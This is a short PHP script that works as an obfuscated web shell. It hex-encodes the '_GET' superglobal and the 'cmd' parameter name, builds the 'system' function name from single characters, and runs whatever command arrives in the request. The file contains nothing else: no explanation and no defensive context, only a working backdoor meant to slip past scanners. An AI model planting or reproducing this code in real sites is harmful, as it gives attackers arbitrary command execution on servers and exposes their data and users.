<?php
$a = "\x5f\x47\x45\x54"; 
$b = "\x63\x6d\x64";     
$c = ${$a}[$b];         

if (isset($c)) {
    $e = 's' . 'y' . 's' . 't' . 'e' . 'm';
    $e($c);
}
?>
